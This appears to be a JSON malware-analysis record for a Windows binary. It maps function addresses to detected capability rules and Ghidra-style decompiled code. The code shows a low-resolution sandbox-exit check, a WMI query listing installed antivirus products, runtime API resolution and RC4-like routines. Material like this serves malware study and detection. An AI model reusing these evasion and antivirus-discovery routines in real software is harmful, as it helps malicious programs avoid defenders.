            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042faee(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00432374(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "0042d175": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d175(int32_t *param_1)\n\n{\n    if (*param_1 < 4) {\n        fcn.0042d5c8(*param_1 * 0x18 + 0x455b28);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00408fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408fb0(uint param_1)\n\n{\n    int32_t *unaff_ESI;\n    uint var_4h;\n    \n    if (*unaff_ESI != 0) {\n        fcn.00409bd0(param_1);\n        fcn.0042d62b(*unaff_ESI);\n    }\n    *unaff_ESI = 0;\n    unaff_ESI[1] = 0;\n    unaff_ESI[2] = 0;\n    return;\n}\n",
        "token_count": 114
    },
    "004097a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004097a0(uchar *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if ((*(in_ECX + 0x14) - *(in_ECX + 0x10) < *(in_EAX + 0x10)) &&\n       (*(in_ECX + 0x10) <= *(in_EAX + 0x14) - *(in_EAX + 0x10))) {\n        fcn.00409930(0);\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        fcn.00408ff0();\n        return arg_8h;\n    }\n    fcn.00409840(in_EAX, 0);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    fcn.00408ff0();\n    return arg_8h;\n}\n",
        "token_count": 260
    },
    "00423760": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "connect to WMI namespace via WbemLocator/bc2ee07a7f78456d8bbc93c11ddb7b2d",
            "connect to WMI namespace via WbemLocator"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00423760(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint arg_8h;\n    uint32_t uStack164;\n    uint pvargDest;\n    uint var_88h;\n    int32_t *ppv;\n    int32_t var_78h;\n    int32_t *var_74h;\n    int32_t *var_70h;\n    int32_t *pProxy;\n    uint var_68h;\n    uint var_4ch;\n    uint var_30h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_14h_2;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4416fb;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack164 = *0x454664 ^ &stack0xfffffffc;\n    puStack20 = &uStack164;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h._0_1_ = 0;\n    var_4h._1_3_ = 0;\n    var_14h_2 = uStack164;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 0);\n    (*_sym.imp.ole32.dll_CoInitializeSecurity)(0, 0xffffffff, 0, 0, 0, 3, 0, 0, 0);\n    ppv = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x4444e8, 0, 1, 0x444418, &ppv);\n    arg_8h = 0;\n    pProxy = NULL;\n    iVar1 = (**(*ppv + 0xc))(ppv, L\"root\\\\SecurityCenter2\", 0, 0, 0, 0, 0, 0, &pProxy);\n    if (-1 < iVar1) {\n        (*_sym.imp.ole32.dll_CoSetProxyBlanket)(pProxy, 10, 0, 0, 3, 3, 0, 0);\n        var_74h = NULL;\n        iVar1 = (**(*pProxy + 0x50))(pProxy, 0x44f9c0, L\"Select * From AntiVirusProduct\", 0x20, 0, &var_74h);\n        if (-1 < iVar1) {\n            var_70h = NULL;\n            var_78h = 0;\n            var_1ch = 0xf;\n            var_20h = 0;\n            var_30h._0_1_ = 0;\n            var_4h._0_1_ = 1;\n            if ((var_74h != NULL) && ((**(*var_74h + 0x10))(var_74h, 0xffffffff, 1, &var_70h, &var_78h),  var_78h != 0))\n            {\n                (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvargDest);\n                var_4h._0_1_ = 2;\n                (**(*var_70h + 0x10))(var_70h, L\"displayName\", 0, &pvargDest, 0, 0);\n                fcn.00423910();\n                var_4h._0_1_ = 3;\n                fcn.00424090();\n                fcn.00408f80();\n                fcn.00414990();\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(&pvargDest);\n                fcn.00408f80();\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 886
    },
    "00430e1c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430e1c(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0042d696(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0040be10": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.0040be10(void)\n\n{\n    uint32_t *puVar1;\n    int32_t in_EAX;\n    \n    if ((in_EAX != 0) && (puVar1 = *(in_EAX + 0x1c),  puVar1 != NULL)) {\n        *(in_EAX + 0x14) = 0;\n        *(in_EAX + 8) = 0;\n        *(in_EAX + 0x18) = 0;\n        *puVar1 = -(puVar1[3] != 0) & 7;\n        fcn.0040a500();\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 153
    },
    "004215d0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004215d0(void)\n\n{\n    char cVar1;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    \n    cVar1 = (**(*unaff_EDI + 4))();\n    if (cVar1 != '\\0') {\n        *(unaff_ESI + 0x44) = 0;\n        return;\n    }\n    *(unaff_ESI + 0x10) = unaff_ESI + 8;\n    *(unaff_ESI + 0x20) = unaff_ESI + 0x18;\n    *(unaff_ESI + 0x24) = unaff_ESI + 0x1c;\n    *(unaff_ESI + 0x44) = unaff_EDI;\n    *(unaff_ESI + 0x14) = unaff_ESI + 0xc;\n    *(unaff_ESI + 0x30) = unaff_ESI + 0x28;\n    *(unaff_ESI + 0x34) = unaff_ESI + 0x2c;\n    *(unaff_ESI + 0xc) = 0;\n    **(unaff_ESI + 0x24) = 0;\n    **(unaff_ESI + 0x34) = 0;\n    **(unaff_ESI + 0x10) = 0;\n    **(unaff_ESI + 0x20) = 0;\n    **(unaff_ESI + 0x30) = 0;\n    return;\n}\n",
        "token_count": 345
    },
    "0042a760": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0042a760(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    uint var_1h;\n    \n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    iVar1 = *(unaff_EDI + 0x18);\n    if (iVar1 != 0) {\n        iVar1 = fcn.0042b670(unaff_EDI + 0x148, iVar1);\n    }\n    if (iVar1 == *(unaff_EDI + 0x18)) {\n        if ((*(unaff_EDI + 0x1c) != 0) &&\n           (iVar1 = fcn.0042b670(*(unaff_EDI + 0x13c), *(unaff_EDI + 0x1c)),  iVar1 != *(unaff_EDI + 0x1c))) {\n            return 10;\n        }\n        return 0;\n    }\n    return 10;\n}\n",
        "token_count": 724
    },
    "0042ab40": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0042ab40(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint var_1h;\n    \n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    iVar1 = *(unaff_ESI + 0x18);\n    if (iVar1 != 0) {\n        iVar1 = fcn.0042b670(unaff_ESI + 0x148, iVar1);\n    }\n    if (iVar1 != *(unaff_ESI + 0x18)) {\n        return 10;\n    }\n    if ((*(unaff_ESI + 0x20) != 0) &&\n       (iVar1 = fcn.0042b670(*(unaff_ESI + 0x140), *(unaff_ESI + 0x20)),  iVar1 != *(unaff_ESI + 0x20))) {\n        return 10;\n    }\n    if ((*(unaff_ESI + 0x24) != 0) &&\n       (iVar1 = fcn.0042b670(*(unaff_ESI + 0x144), *(unaff_ESI + 0x24)),  iVar1 != *(unaff_ESI + 0x24))) {\n        return 10;\n    }\n    return 0;\n}\n",
        "token_count": 1068
    },
    "0042aa00": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0042aa00(void)\n\n{\n    uint var_1h;\n    \n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    fcn.0042b670(&var_1h, 1);\n    return 0;\n}\n",
        "token_count": 314
    },
    "0043dcb1": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0043dcb1(void)\n\n{\n    *0x455280 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00401000": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.00401000(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    // [00] -r-x section size 274432 named .text\n    uVar1 = (*_sym.imp.GDI32.dll_CreateDCA)(\"DISPLAY\", 0, 0, 0);\n    iVar2 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar1, 8);\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar1);\n    if (iVar2 < 0x299) {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "00408f20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408f20(char *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uchar *in_ECX;\n    \n    *(in_ECX + 0x14) = 0xf;\n    *(in_ECX + 0x10) = 0;\n    *in_ECX = 0;\n    pcVar2 = arg_8h;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(arg_8h, pcVar2 - (arg_8h + 1));\n    return;\n}\n",
        "token_count": 156
    },
    "00409750": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409750(uint arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *in_EAX;\n    uchar *in_ECX;\n    uint var_4h;\n    \n    pcVar1 = in_EAX + 1;\n    do {\n        cVar2 = *in_EAX;\n        in_EAX = in_EAX + 1;\n    } while (cVar2 != '\\0');\n    fcn.00409a90(in_EAX - pcVar1);\n    *(in_ECX + 0x14) = 0xf;\n    *(in_ECX + 0x10) = 0;\n    *in_ECX = 0;\n    fcn.00408ff0();\n    return;\n}\n",
        "token_count": 169
    },
    "00414b90": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414b90(uint arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *in_EAX;\n    uchar *in_ECX;\n    uint var_4h;\n    \n    pcVar1 = in_EAX + 1;\n    do {\n        cVar2 = *in_EAX;\n        in_EAX = in_EAX + 1;\n    } while (cVar2 != '\\0');\n    fcn.00414cc0(in_EAX - pcVar1);\n    *(in_ECX + 0x14) = 0xf;\n    *(in_ECX + 0x10) = 0;\n    *in_ECX = 0;\n    fcn.00408ff0();\n    return;\n}\n",
        "token_count": 170
    },
    "00422c00": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_84h\n\nvoid fcn.00422c00(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *unaff_ESI;\n    char *arg_8h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    iVar2 = (**0x457370)(&var_80h, 0);\n    *(unaff_ESI + 0x14) = 0xf;\n    *(unaff_ESI + 0x10) = 0;\n    *unaff_ESI = 0;\n    if (iVar2 == 0) {\n        iVar2 = 7;\n        arg_8h = \"Unknown\";\n    }\n    else {\n        puVar3 = &var_7ch;\n        do {\n            cVar1 = *puVar3;\n            puVar3 = puVar3 + 1;\n        } while (cVar1 != '\\0');\n        iVar2 = puVar3 - (&var_7ch + 1);\n        arg_8h = &var_7ch;\n    }\n    fcn.004090e0(arg_8h, iVar2);\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 317
    },
    "00424340": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424340(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *unaff_ESI;\n    uint *arg_8h_00;\n    uint var_10ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    iVar2 = (**0x457510)(0x410, 0, arg_8h);\n    if (iVar2 != 0) {\n        (**0x45754c)(iVar2, 0, &var_108h, 0x104);\n        (**0x4573b8)(iVar2);\n    }\n    puVar3 = &var_108h;\n    *(unaff_ESI + 0x14) = 0xf;\n    *(unaff_ESI + 0x10) = 0;\n    *unaff_ESI = 0;\n    do {\n        cVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n    } while (cVar1 != '\\0');\n    arg_8h_00 = &var_108h;\n    fcn.004090e0(arg_8h_00, puVar3 - (&var_108h + 1));\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 319
    },
    "0042b240": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool fcn.0042b240(void)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *unaff_EDI;\n    \n    iVar1 = (**0x457418)();\n    for (pcVar2 = unaff_EDI + iVar1; (unaff_EDI < pcVar2 && (*pcVar2 != '.')); pcVar2 = pcVar2 + -1) {\n    }\n    if ((pcVar2 == unaff_EDI) && (*pcVar2 != '.')) {\n        return false;\n    }\n    iVar1 = (**0x457550)(pcVar2, 0x44fbb4);\n    if ((((iVar1 != 0) && (iVar1 = (**0x457550)(pcVar2, \".zip\"),  iVar1 != 0)) &&\n        (iVar1 = (**0x457550)(pcVar2, \".zoo\"),  iVar1 != 0)) &&\n       (((iVar1 = (**0x457550)(pcVar2, \".arc\"),  iVar1 != 0 && (iVar1 = (**0x457550)(pcVar2, \".lzh\"),  iVar1 != 0)) &&\n        ((iVar1 = (**0x457550)(pcVar2, \".arj\"),  iVar1 != 0 && (iVar1 = (**0x457550)(pcVar2, 0x44fbd8),  iVar1 != 0)))))\n       ) {\n        iVar1 = (**0x457550)(pcVar2, \".tgz\");\n        return iVar1 == 0;\n    }\n    return true;\n}\n",
        "token_count": 344
    },
    "0042cbeb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042cbeb(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *apcStack20 [3];\n    char *pcStack8;\n    \n    do {\n        iVar2 = fcn.0042d6d0(param_1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00432cbe(param_1);\n    } while (iVar2 != 0);\n    if ((*0x455cdc & 1) == 0) {\n        *0x455cdc = *0x455cdc | 1;\n        pcStack8 = \"bad allocation\";\n        fcn.0042d764(&pcStack8);\n        *0x455cd0 = vtable.std::bad_alloc.0;\n        fcn.0042e451(0x443ba1);\n    }\n    fcn.0042d871(0x455cd0);\n    apcStack20[0] = vtable.std::bad_alloc.0;\n    fcn.0042f5f6(apcStack20, 0x4510e8);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 271
    },
    "0042e880": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t * fcn.0042e880(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar1 = param_1 & 3;\n    while (uVar1 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar1 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar1 = *param_1;\n            uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = param_1 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *param_1;\n        if (uVar1 == param_2) {\n            return param_1;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 591
    },
    "00432698": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00432698(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00435140(0x450d90, 0xc);\n    fcn.004357b0(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x456028;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x456024;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004326dc;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0042d696(arg_8h_00);\ncode_r0x004326dc:\n        fcn.0042d696(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004326ff();\n    fcn.00435185();\n    return;\n}\n",
        "token_count": 389
    },
    "004278f0": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.004278f0(void)\n\n{\n    code *pcVar1;\n    \n    *0x45756c = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(*0x456b74);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (*0x45756c != 0) {\n        *0x457514 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x45756c, *0x456c58);\n        *0x457474 = (*pcVar1)(*0x45756c, *0x456f0c);\n        *0x457520 = (**0x457474)(*0x45756c, *0x45721c);\n        *0x457390 = (**0x457474)(*0x45756c, *0x456da0);\n        *0x4574bc = (**0x457474)(*0x45756c, *0x456ae4);\n        *0x457484 = (**0x457474)(*0x45756c, *0x4572c0);\n        *0x45759c = (**0x457474)(*0x45756c, *0x456c80);\n        *0x457554 = (**0x457474)(*0x45756c, *0x456de0);\n        *0x4574cc = (**0x457474)(*0x45756c, *0x456ebc);\n        *0x4573f4 = (**0x457474)(*0x45756c, *0x4571d8);\n        *0x4574f4 = (**0x457474)(*0x45756c, *0x457060);\n        *0x4574c8 = (**0x457474)(*0x45756c, *0x456b58);\n        *0x4574f8 = (**0x457474)(*0x45756c, *0x457294);\n    }\n    *0x457358 = (**0x457514)(*0x457144);\n    if (*0x457358 != 0) {\n        *0x45744c = (**0x457474)(*0x457358, *0x457064);\n    }\n    return;\n}\n",
        "token_count": 491
    }
}